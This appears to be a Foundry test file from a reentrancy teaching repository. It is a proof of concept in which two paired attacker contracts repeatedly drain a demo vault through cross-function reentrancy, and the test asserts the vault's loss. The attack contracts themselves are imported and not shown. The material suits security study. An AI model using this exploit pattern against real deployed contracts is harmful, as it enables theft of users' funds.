// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import {Test} from "forge-std/Test.sol";

import {CFRVault} from "src/reentrancy/cross-function/CFRVault.sol";
import {ICFRVault, CFRAttack} from "src/reentrancy/cross-function/CFRAttack.sol";

contract CFRPoC is Test {
    address OWNER = makeAddr("Owner");

    address ALICE = makeAddr("Alice");
    address BOB = makeAddr("Bob");

    address ATTACKER = makeAddr("Attacker");

    CFRVault cfrVault;
    CFRAttack cfrAttack1;
    CFRAttack cfrAttack2;

    function setUp() public {
        vm.deal(ALICE, 100 ether);
        vm.deal(BOB, 100 ether);
        vm.deal(ATTACKER, 1 ether);

        vm.prank(OWNER);
        cfrVault = new CFRVault();

        vm.startPrank(ATTACKER);

        cfrAttack1 = new CFRAttack(address(cfrVault));
        cfrAttack2 = new CFRAttack(address(cfrVault));

        cfrAttack1.updateCFRAttackPeer(address(cfrAttack2));
        cfrAttack2.updateCFRAttackPeer(address(cfrAttack1));

        vm.stopPrank();
    }

    function testAttack() public {
        vm.prank(ALICE);
        cfrVault.deposit{value: 100 ether}();
        vm.prank(BOB);
        cfrVault.deposit{value: 100 ether}();

        vm.startPrank(ATTACKER);

        cfrAttack1.initializeAttack{value: 1 ether}();

        assertEq(cfrVault.balances(address(cfrAttack1)), 0);
        assertEq(cfrVault.balances(address(cfrAttack2)), 1 ether);

        cfrAttack2.attackNext();

        assertEq(cfrVault.balances(address(cfrAttack1)), 1 ether);
        assertEq(cfrVault.balances(address(cfrAttack2)), 0);

        cfrAttack1.attackNext();

        assertEq(cfrVault.balances(address(cfrAttack1)), 0);
        assertEq(cfrVault.balances(address(cfrAttack2)), 1 ether);

        cfrAttack2.attackNext();

        assertEq(cfrVault.balances(address(cfrAttack1)), 1 ether);
        assertEq(cfrVault.balances(address(cfrAttack2)), 0);

        cfrAttack1.attackNext();

        assertEq(cfrVault.balances(address(cfrAttack1)), 0);
        assertEq(cfrVault.balances(address(cfrAttack2)), 1 ether);

        cfrAttack2.attackNext();

        assertEq(cfrVault.balances(address(cfrAttack1)), 1 ether);
        assertEq(cfrVault.balances(address(cfrAttack2)), 0);

        assertEq(address(cfrVault).balance, 195 ether);
    }
}
